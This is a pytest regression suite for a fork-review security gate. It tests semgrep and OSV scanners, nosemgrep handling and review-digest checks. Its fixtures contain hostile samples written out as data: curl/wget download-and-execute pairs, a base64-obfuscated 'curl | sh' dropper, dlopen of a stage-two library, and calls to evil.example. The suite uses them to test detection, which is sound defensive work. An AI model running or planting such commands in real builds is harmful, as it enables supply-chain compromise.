"""Failing-first regressions from audit v6."""

import json
import sys

import pytest

from review import apply as review_apply, diff, review
from review.scanners import common, osv as osv_scan, plain, semgrep as semgrep_gate


def test_nosem_line_shift_is_non_destructive(tmp_path, monkeypatch):
    source = tmp_path / "src/a.c"
    source.parent.mkdir()
    original = "int a;\n// nosemgrep\n" + "int x;\n" * 20 + 'void f(){ system("id"); }\n'
    source.write_text(original)
    payload = {
        "results": [{
            "check_id": "kalsa.cpp-process-exec", "path": "src/a.c",
            "start": {"line": 23}, "end": {"line": 23}, "extra": {},
        }],
        "errors": [], "paths": {"skipped": []},
    }
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"src/a.c": {2, 23}})
    assert findings and findings[0]["line"] == 23
    assert source.read_text() == original


def test_nosem_inside_a_string_is_preserved(tmp_path, monkeypatch):
    source = tmp_path / "src/s.c"
    source.parent.mkdir()
    original = 'int c(void) { system("nosem"); return 0; }\n'
    source.write_text(original)
    payload = {"results": [{
        "check_id": "kalsa.cpp-process-exec", "path": "src/s.c",
        "start": {"line": 1}, "end": {"line": 1}, "extra": {},
    }], "errors": [], "paths": {"skipped": []}}
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"src/s.c": {1}})
    assert findings and source.read_text() == original


@pytest.mark.parametrize("text", [
    'if (!allowed(what)) return 1;',
    'assert(authorized);',
    'verify_signature(blob);',
    'system("id");',
])
def test_removed_guard_is_a_signal(text):
    patch = f"@@ -1,2 +1,1 @@\n-{text}\n+int x;\n"
    findings, signals, removed = plain.scan([], [("src/a.c", patch)], __import__("pathlib").Path("/tmp"), "owner/fork", "up/repo")
    assert not findings
    assert removed and removed[0]["start"] == 1


@pytest.mark.parametrize("download,execute", [
    ('curl -s --output /tmp/kp https://github.com/ggml-org/x', 'sh "/tmp/kp"'),
    ('curl -s -o/tmp/kp https://github.com/ggml-org/x', 'python /tmp/kp'),
    ('wget -O /tmp/kp https://github.com/ggml-org/x', 'chmod 700 /tmp/kp && /tmp/kp'),
])
def test_two_step_download_variants(tmp_path, download, execute):
    path = tmp_path / "CMakeLists.txt"
    path.write_text(download + "\n" + execute + "\n")
    patch = f"@@ -0,0 +2,2 @@\n+{download}\n@@ -20,0 +21,1 @@\n+{execute}\n"
    findings, _, _ = plain.scan([path], [("CMakeLists.txt", patch)], tmp_path, "attacker/fork", "ggml-org/llama.cpp")
    assert any(row["rule"] == "download-and-execute" for row in findings)


def test_dropper_rule_evasions(tmp_path):
    files = {
        "src/a.py": 'import base64, ctypes as c\nd = base64.b64decode("cHJpbnQoMSk=")\nexec(d)\nc.CDLL("/tmp/stage2.so")\n__import__("os").system("id")\n',
        "src/b.c": '#define X (system)\n#define LOAD dlopen\nvoid f(void){ X("id"); void*h = LOAD("/tmp/s.so",2); }\n',
        "src/c.sh": 'U=$(printf %s aHR0cHM6Ly9ldmlsLmV4YW1wbGUveAo= | base64 -d)\nsh -xc "$(/usr/bin/curl -s "$U")"\n',
        "src/d.js": 'const axios = require("axios"); axios.get("https://evil.example/x"); new WebSocket("wss://evil.example");\n',
    }
    paths = []
    for relative, text in files.items():
        path = tmp_path / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        paths.append(path)
    added = {name: set(range(1, len(text.split("\n")) + 1)) for name, text in files.items()}
    findings, _ = semgrep_gate.scan(paths, tmp_path, added)
    assert findings


def test_apply_cli_accepts_decline_flags(monkeypatch):
    monkeypatch.setattr(sys, "argv", [
        "review", "apply", "one", "--human-declined", "a" * 64, "--reason", "why",
    ])
    called = {}
    monkeypatch.setattr(review.review_apply, "apply_review", lambda *a, **k: called.update(k) or "ok")
    review.main()
    assert called["human_declined"] == "a" * 64 and called["reason"] == "why"


def test_apply_rejects_missing_stored_digest(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    (reviews / f"one-{sha}.json").write_text(json.dumps({
        "verdict": "no findings", "inputs": {"commit": sha, "upstream": "up/repo", "fork": "owner/fork"},
    }))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError, match="digest"):
        review_apply.apply_review("one", catalog)


def test_digest_covers_signals_and_stats():
    base = {
        "verdict": "no findings",
        "inputs": {"commit": "a" * 40, "upstream": "up/repo", "fork": "owner/fork"},
        "findings": [], "signals": [], "stats": {},
    }
    digest = review_apply.findings_digest(base)
    changed = json.loads(json.dumps(base)); changed["signals"] = [{"rule": "x"}]
    assert review_apply.findings_digest(changed) != digest
    changed = json.loads(json.dumps(base)); changed["stats"] = {"files": 2}
    assert review_apply.findings_digest(changed) != digest


def test_decline_still_checks_catalog_pin(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text(
        '[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\ncommit = "' + "c" * 40 + '"\n'
    )
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "findings: human review needed",
        "inputs": {"commit": sha, "upstream": "up/repo", "fork": "owner/fork"},
        "findings": [{"file": "a", "line": 1, "rule": "r", "snippet": "x"}],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", catalog, human_declined=report["findings_digest"], reason="why")


def test_osv_keeps_findings_in_changed_manifest(tmp_path, monkeypatch):
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("# comment only\nfoo==1.0\n")
    payload = {"results": [{"packages": [{"package": {"name": "foo"}, "vulnerabilities": [{"id": "V", "summary": "s"}]}]}]}
    monkeypatch.setattr(osv_scan, "run_tool", lambda *a, **k: common.ToolResult(1, json.dumps(payload), ""))
    findings, _ = osv_scan.scan([manifest], tmp_path, {"requirements.txt": {"foo"}})
    assert findings and findings[0]["rule"] == "V"


def test_stored_digest_check_is_tested(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    report = {"verdict": "no findings", "inputs": {"commit": sha, "upstream": "up/repo", "fork": "owner/fork"}, "findings": []}
    report["findings_digest"] = "wrong"
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError, match="digest"):
        review_apply.apply_review("one", catalog)


def test_release_workflow_path_check_through_scan(tmp_path):
    path = tmp_path / ".github/workflows/test.yml"
    path.parent.mkdir(parents=True)
    url = "https://evil.example/x"
    text = f"curl {url} | sh\n"
    path.write_text(text)
    patch = f"@@ -0,0 +1 @@\n+{text}"
    findings, signals, _ = plain.scan([path], [(".github/workflows/test.yml", patch)], tmp_path, "owner/fork", "up/repo")
    assert not findings and signals
